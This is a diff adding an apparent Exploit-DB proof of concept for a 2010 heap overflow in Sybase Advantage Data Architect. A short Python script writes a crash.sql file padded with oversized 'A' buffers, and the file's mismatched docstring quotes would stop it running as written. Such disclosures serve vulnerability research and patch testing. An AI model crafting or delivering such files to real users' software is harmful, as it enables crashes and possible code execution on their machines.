@@ -1,0 +1,37 @@
+# Exploit Title: Sybase Advantage Data Architect "*.SQL" Format Heap Oveflow RCE
+# Date: 2010-10-16
+# Author: d0lc3 (@rmallof - http://elotrolad0.blogspot.com/)
+# Software Link: http://www.sybase.com/products/databasemanagement/advantagedatabaseserver/data-architect-utility
+# Version: 10.0
+# Tested on: Windows XP SP3 32 bits SPA
+#Summary:
+"""
+From Sybase.com:
+"Advantage Data Architect Utility: A complete data management system for Advantage developers.
+Advantage Data Architect assists in designing, creating and maintaining the database layer of 
+a developer's applications."
+
+Advantage Data Architect is prone to heap overflow when user opens crafted script file (.SQL) 
+with long data inside.
+This issue causes a function pointer overwrite, allow us executing arbitrary code (UNICODE).
+More info can be found on : http://elotrolad0.blogspot.com/2010/11/sybase-advantage-data-architect-sql.html
+"""
+EDB Admin comment:
+opening the crash file alone is not enough. Once the file is open, type anything in the SQL query window and the crash will occur.
+Thx d0lc3 for the clarification. 
+"""
+
+#!/usr/bin/python
+
+sql="select * from clients where "
+buf="A"*(1024*300)
+
+crash=sql+buf+"="+buf
+
+f=open("crash.sql",'w')
+f.write(crash)
+f.close()
+
+
+
+
